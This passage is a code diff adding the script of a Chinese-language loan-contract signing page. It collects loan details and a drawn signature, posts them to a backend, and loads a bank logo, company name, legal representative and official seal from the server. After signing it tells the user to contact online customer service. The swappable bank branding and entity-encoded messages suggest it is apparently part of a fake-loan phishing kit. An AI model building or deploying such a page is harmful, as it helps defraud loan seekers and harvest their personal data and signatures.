+    const currentDay = currentDate.getDate();
+    const num = '0'+Math.floor(Math.random() * 1000000);
+    $('#dss').text(currentMonth + "" + currentDay);
+    $('#dsss').text(num);
+    $('#hao').val(num);
+    $('#url').val(location.href);
+    $('#riqi').val(currentMonth + "" + currentDay);
+    $('[type=text]').blur(function () {
+        if (!$.trim($(this).val())) {
+            $(this).next().slideDown();
+        } else {
+            $(this).next().slideUp();
+        }
+    });
+    $('.kjtx a').click(function () {
+        let je = parseInt($(this).text());
+        $('[name=SingleLine4]').val(je);
+        $('#money').text(je * 10000 + '.00');
+        $('#moneybig').text(numToCny(je * 10000));
+    })
+    $('[name=SingleLine4]').blur(function () {
+        let edu = Number($('[name=SingleLine4]').val());
+        if (isNaN(edu) || edu < 1 || edu > 100) {
+// 	if(!/^([0-9]{1,2}|100)$/.test(edu)||edu==0){
+            $('#settingsErr-div').show();
+            $('.popUpInner').css('width', ($(window).width() - 30) + 'px');
+            $('.popUpOuter').css('left', '15px');
+            $('#msgBody').html('&#x60a8;&#x586b;&#x5199;&#x7684;&#x8d37;&#x6b3e;&#x989d;&#x5ea6;&#x9519;&#x8bef;&#xff0c;&#x8bf7;&#x586b;&#x5199;&#x0031;&#x002d;&#x0031;&#x0030;&#x0030;&#x6570;&#x5b57;&#xff0c;&#x4f8b;&#x5982;&#xff1a;&#x7533;&#x8bf7;&#x8d37;&#x6b3e;&#x0031;&#x4e07;&#xff0c;&#x8bf7;&#x586b;&#x5199;&#x0031;&#xff0c;&#x7533;&#x8bf7;&#x8d37;&#x6b3e;&#x0031;&#x0030;&#x4e07;&#xff0c;&#x8bf7;&#x586b;&#x5199;&#x0031;&#x0030;&#xff0c;&#x4ee5;&#x6b64;&#x7c7b;&#x63a8;&#x3002;')
+// 		ZFLive.showSplashMessage('请输入10000-1000000之间的数');
+            $('[name=SingleLine4]').val('');
+            $('#error-SingleLine4').text('&#x8bf7;&#x8f93;&#x5165;&#x8d37;&#x6b3e;&#x989d;&#x5ea6;');
+            return false;
+        }
+        $('#money').text(edu * 10000 + '.00');
+        $('#moneybig').text(numToCny(edu * 10000));
+    });
+
+    function closeErrorPopup() {
+        $("#settingsErr-div").hide()
+    }
+
+    function numToCny(n) {
+        if (!/^(0|[1-9]\d*)(\.\d+)?$/.test(n)) return "数据非法";
+        var unit = "京亿万仟佰拾兆万仟佰拾亿仟佰拾万仟佰拾元角分", str = "";
+        n += "00";
+        var p = n.indexOf('.');
+        if (p >= 0)
+            n = n.substring(0, p) + n.substr(p + 1, 2);
+        unit = unit.substr(unit.length - n.length);
+        for (var i = 0; i < n.length; i++) str += '零壹贰叁肆伍陆柒捌玖'.charAt(n.charAt(i)) + unit.charAt(i);
+        return str.replace(/零(仟|佰|拾|角)/g, "零").replace(/(零)+/g, "零").replace(/零(兆|万|亿|元)/g, "$1").replace(/(兆|亿)万/g, "$1").replace(/(京|兆)亿/g, "$1").replace(/(京)兆/g, "$1").replace(/(京|兆|亿|仟|佰|拾)(万?)(.)仟/g, "$1$2零$3仟").replace(/^元零?|零分/g, "").replace(/(元|角)$/g, "$1整");
+    }
+
+    $('[name=SingleLine5]').blur(function () {
+        let yongtu = $('[name=SingleLine5]').val();
+        $('#yongtu').text(yongtu);
+    });
+    $('[name=SingleLine15]').blur(function () {
+        let cshy = $('[name=SingleLine15]').val();
+        $('#hangye').text(cshy);
+    });
+    $('[name=SingleLine6]').blur(function () {
+        let qi = $(this).val();
+        $(this).val(qi.replace(/[^\d]/g, ''));
+        let addMonth, qixian;
+        addMonth = qixian = Number($('[name=SingleLine6]').val());
+        $('#m3').text(qixian);
+        var nextY = y;
+        var nextM = m;
+        var nextD = d;
+        //如果当前月+增加的月>11 这里之所以用11是因为 js的月份从0开始
+        if ((m + addMonth) > 11) {
+            let yy = Math.floor((m + addMonth) / 12);
+            nextY = y + yy;
+            nextM = parseInt(m + addMonth) - 12 * yy;
+        } else {
+            nextM = m + addMonth;
+        }
+        var daysInNextMonth = daysInMonth(nextY, nextM);
+        if (nextD > daysInNextMonth) {
+            nextD = daysInNextMonth;
+        }
+        nextM += 1;
+        if (nextM < 10) {
+            $('#dss').text(nextM+''+nextD);
+            nextM = '0' + nextM;
+        }
+        if (nextD < 10) {
+            nextD = '0' + nextD;
+        }
+        $('#y2').text(nextY);
+        $('#m2').text(nextM);
+        $('#d2').text(nextD);
+        $('#dsss').text('0'+Math.floor(Math.random() * 1000000));
+    });
+
+    function daysInMonth(year, month) {
+        if (month == 1) {
+            if (year % 4 == 0 && year % 100 != 0)
+                return 29;
+            else
+                return 28;
+        } else if ((month <= 6 && month % 2 == 0) || (month > 6 && month % 2 == 1))
+            return 31;
+        else
+            return 30;
+    }
+
+    function displaySplashMsg(splashMsg) {
+        $("#splash_msg_text").text(splashMsg);
+        $("#splash_message_div").show();
+        var marginTop = 100;
+        $("#splash_message_div_cont").animate({
+            opacity: "1",
+            marginTop: marginTop
+        }, 600),
+            $("#splash_message_div_cont").slideDown(500).delay(2e3).animate({
+                opacity: "0.5",
+                marginTop: -marginTop
+            }, 600).slideUp(500)
+        setTimeout(function () {
+            $("#splash_message_div").hide();
+        }, 2500)
+    }
+
+    $('[name=hkfs2]').click(function () {
+        return false;
+    });
+    $('[name=hkfs]').click(function () {
+        $('[name=hkfs2]').prop('checked', false);
+        $('#' + $(this).attr('id') + '2').prop('checked', true);
+    });
+
+    function getUrlParam(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)"); //构造一个含有目标参数的正则表达式对象
+        var r = window.location.search.substr(1).match(reg); //匹配目标参数
+        if (r != null) return unescape(r[2]);
+        return null; //返回参数值
+    }
+
+    var tj = getUrlParam('tj');
+    var userinfo = localStorage.getItem('userinfo');
+    if (userinfo || tj) {
+        $(".container").hide();
+        $("#splash_message_div").show();
+        $("#splash_message_div_cont").animate({
+            opacity: "1",
+            marginTop: 150
+        }, 600);
+        $("#splash_msg_text").text('合同签署成功，请联系在线客服');
+    }
+    $.ajax({
+        type: 'post',
+        url: dm + '/api/index/gettreaty',
+        data: {},
+        success: function (res) {
+            if (!res.error) {
+                $('#xyDiv').html(base64_decode(res.data));
+                $('#yll').html(base64_decode(res.yll));
+                $('#logo').attr('src', base64_decode(res.bankimage));
+                $('#title').html(base64_decode(res.htname));
+                $(document).prop('title', base64_decode(res.htname));
+                $('#dkname').html(base64_decode(res.dkname));
+                $('#zcaddress').html(base64_decode(res.zcaddress));
+                $('#faren').html(base64_decode(res.faren));
+                $('#dkcode').html(base64_decode(res.dkcode));
+                $('#hetongimag').attr('src', base64_decode(res.gongzhang));
+
+            }
+        }
+    })
+    var date = new Date();
+    var y, year, m, month, d, day;
+    y = year = date.getFullYear();
+    m = date.getMonth();
+    month = m + 1;
+    d = day = date.getDate();
+    if (month < 10) {
+        month = '0' + month;
+    }
+    if (day < 10) {
+        day = '0' + day;
+    }
+    $('#Date-date').val(year + '/' + month + '/' + day);
+    $('#y1,#y2').text(year);
+    $('#m1,#m2').text(month);
+    $('#d1,#d2').text(day);
+    var canvas = document.getElementById('drawingCanvas-Signature');
+
+    $('.fmSmtButton').click(function () {
+        if ($(this).hasClass('disabled')) {
+            return;
+        }
+        var arr = [];
+        var flag = true, flag2 = true;
+        $('[type=text]').each(function () {
+            if (!$.trim($(this).val())) {
+                arr.push(this);
+                flag = false;
+                $(this).next().slideDown();
+            } else {
+                $(this).next().slideUp();
+            }
+        });
+        $(arr[0]).focus();
+        let TermsConditions = $('[name=TermsConditions]').get(0).checked;
+        if (!TermsConditions) {
+            $('#error-TermsConditions').slideDown();
+        } else {
+            $('#error-TermsConditions').slideUp();
+        }
+        let data = canvas.getContext('2d').getImageData(0, 0, canvas.width, canvas.height).data;
+        for (let i = 0; i < data.length; i++) {
+            if (data[i] != 0) {
+                flag2 = false;
+                break;
+            }
+        }
+        if (flag2) {
+            $('#error-Signature').slideDown();
+        } else {
+            $('#error-Signature').slideUp();
+        }
+        if (!flag || !TermsConditions || flag2) {
+            return;
+        }
+        let edu = Number($('[name=SingleLine4]').val());
+        if (isNaN(edu) || edu < 1 || edu > 100) {
+// 	if(!/^([0-9]{1,2}|100)$/.test(edu)||edu==0){
+            $('#settingsErr-div').show();
+            $('.popUpInner').css('width', ($(window).width() - 30) + 'px');
+            $('.popUpOuter').css('left', '15px');
+            $('#msgBody').html('&#x60a8;&#x586b;&#x5199;&#x7684;&#x8d37;&#x6b3e;&#x91d1;&#x989d;&#x9519;&#x8bef;&#xff0c;&#x8bf7;&#x8f93;&#x5165;&#x0031;&#x002d;&#x0031;&#x0030;&#x0030;&#x6570;&#x5b57;&#xff0c;&#x6bd4;&#x5982;&#xff1a;&#x8d37;&#x6b3e;&#x0031;&#x4e07;&#xff0c;&#x8bf7;&#x8f93;&#x5165;&#x0031;&#xff0c;&#x8d37;&#x6b3e;&#x0031;&#x0030;&#x4e07;&#xff0c;&#x8bf7;&#x8f93;&#x5165;&#x0031;&#x0030;&#xff0c;&#x4ee5;&#x6b64;&#x7c7b;&#x63a8;&#x3002;')
+// 		ZFLive.showSplashMessage('请输入10000-1000000之间的数');
+            $('[name=SingleLine4]').val('');
+            $('#error-SingleLine4').text('&#x8bf7;&#x8f93;&#x5165;&#x8d37;&#x6b3e;&#x989d;&#x5ea6;');
+            return false;
+        }
+        $('#Signature').val(canvas.toDataURL());
+        var that = this;
+        $(this).addClass('disabled');
+        $.ajax({
+            type: 'post',
+            url: dm + '/api/index/addUser_n',
+            data: $('form').serialize(),
+            success: function (res) {
+                $(that).removeClass('disabled');
+                if (!res.error) {
+                    $("#splash_msg_text").text(res.message);
+                    $("#splash_message_div").show();
+                    $("#splash_message_div_cont").animate({
+                        opacity: "1",
+                        marginTop: 150
+                    }, 600);
+                    $("#splash_message_div_cont").slideDown(500)
+                    localStorage.setItem('userinfo', 1);
+                    $('.container').hide();
+                } else {
+                    displaySplashMsg(res.message);
+                }
+            },
+            error: function (xhr, status, error) {
+                displaySplashMsg('网络错误' + error);
+            }
+        })
+    });
+
+    function clearSignature(signElemID) {
+        var signatureElem = document.getElementById(signElemID);
+        signatureElem.getContext("2d").clearRect(0, 0, signatureElem.width, signatureElem.height)
+    }
+
+    function getXYCoords(event, signatureElem, isTouchEvent) {
+        var xCoordinate, yCoordinate, xPosition, yPosition, signElemLeftPos = $(signatureElem).offset().left,
+            signElemTopPos = $(signatureElem).offset().top;
+        return isTouchEvent ? (xPosition = event.changedTouches[0].clientX,
+            yPosition = event.changedTouches[0].clientY) : (xPosition = event.clientX,
+            yPosition = event.clientY),
+            isTouchEvent || !event.pageX && !event.pageY ? isTouchEvent && (event.changedTouches[0].pageX || event.changedTouches[0].pageY) ? (xCoordinate = event.changedTouches[0].pageX,
+                yCoordinate = event.changedTouches[0].pageY) : (xCoordinate = xPosition + document.body.scrollLeft + document.documentElement.scrollLeft,
+                yCoordinate = yPosition + document.body.scrollTop + document.documentElement.scrollTop) : (xCoordinate = event.pageX,
+                yCoordinate = event.pageY),
+            {
+                X: xCoordinate - signElemLeftPos,
+                Y: yCoordinate - signElemTopPos
+            }
+    }
+
+    function startScribbling(event, canvasElem, context, isTouchEvent, fontColor) {
+        var position = getXYCoords(event, canvasElem, isTouchEvent);
+        context.lineTo(position.X, position.Y),
+            context.stroke(),
+            context.strokeStyle = fontColor
+    }
+
+    function endScribbling(event, canvasElem, context, fontColor) {
+        startScribbling(event, canvasElem, context, !1, fontColor),
+            context.closePath(),
+            $(canvasElem).off("mousemove").off("mouseup").off("mouseout")
+    }
+
+    function getClosestFieldElemLi(elem) {
+        return $(elem).closest("li[elname=livefield-elem]");
+    }
+
+    function removeErrorFromLiElem(elem) {
+
+    }
+
+    function setCanvasElemWidth(compname) {
+        var canvasElem = document.getElementById("drawingCanvas-" + compname);
+        if (null !== canvasElem && "undefined" !== $.type(canvasElem)) {
+            var imgElem = document.getElementById("img-" + compname);
+            canvasElem.width = $("#signContainer-" + compname).parent().width(),
+            imgElem && $(imgElem).attr("class", "signImg signArea")
+        }
+    }
+
+    setCanvasElemWidth("Signature");	//No I18N
+    $("#drawingCanvas-Signature").mousedown(function (event) {
+        var canvasElem = document.getElementById("drawingCanvas-Signature"); //No I18N
+        var signatureFieldParent = $(canvasElem).attr('signaturefieldparent'); //No I18N
+        var fontColor = "#000000";
+        var inputElem = ""; //No I18N
+        if (signatureFieldParent == "subform") {
+            inputElem = $("#formBodyDiv").find(".formFieldWrapper li[elemType=subFormField][viewtype=1] input[type=text]:first"); //No I18N
+            if (inputElem.length == 0) { //No I18N
+                inputElem = $("#formBodyDiv").find(".formFieldWrapper li[elemType=subFormField][viewtype=1] textarea:first"); //No I18N
+            }
+        } else { //No I18N
+            inputElem = $("#formBodyDiv").find(".formFieldWrapper > .tempFrmWrapper > .tempContDiv input[type=text]:first"); //No I18N
+            if (inputElem.length == 0) { //No I18N
+                inputElem = $("#formBodyDiv").find(".formFieldWrapper > .tempFrmWrapper > .tempContDiv textarea:first"); //No I18N
+            }
+        }
+        if (inputElem != "" && inputElem.length > 0) {
+            fontColor = inputElem.css("color");// No I18N
+        }
+        var context = canvasElem.getContext("2d");// No I18N
+        var position = getXYCoords(event, canvasElem, false);
+        context.moveTo(position.X, position.Y);
+        context.beginPath();
+        $(this).mousemove(function (event) {
+            startScribbling(event, canvasElem, context, false, fontColor);
+        }).mouseup(function (event) {
+            endScribbling(event, canvasElem, context, fontColor);
+            var fieldElem = getClosestFieldElemLi(canvasElem);// No I18N
+            removeErrorFromLiElem(fieldElem);// No I18N
+        }).mouseout(function (event) {
+            endScribbling(event, canvasElem, context, fontColor);
+            var fieldElem = getClosestFieldElemLi(canvasElem);// No I18N
+            removeErrorFromLiElem(fieldElem);// No I18N
+        });
+        this.addEventListener('touchstart', function (event) {
+            position = getXYCoords(event, canvasElem, true);
+            context.moveTo(position.X, position.Y);
+            context.beginPath();
+            event.preventDefault();
+        }, false);
+        this.addEventListener('touchmove', function (event) {
+            startScribbling(event, canvasElem, context, true, fontColor);
+            event.preventDefault();
+        }, false);
+    });
+    var userAgent = window.navigator.userAgent;
+    var msie = userAgent.indexOf("MSIE ");
+    if (msie > 0) {
+        $("#drawingCanvas-Signature").keypress(function (event) {
+            if (event.keyCode === 13) {
+                event.preventDefault();
+            }
+        });
+    }
+    if (false == true)  //No I18N
+    {
+        $("#drawingCanvas-Signature").css("pointer-events", "none");//No I18N
+        $("#drawingCanvas-Signature").css("cursor", "default");//No I18N
+    }
+</script>
+</body>
+</html>
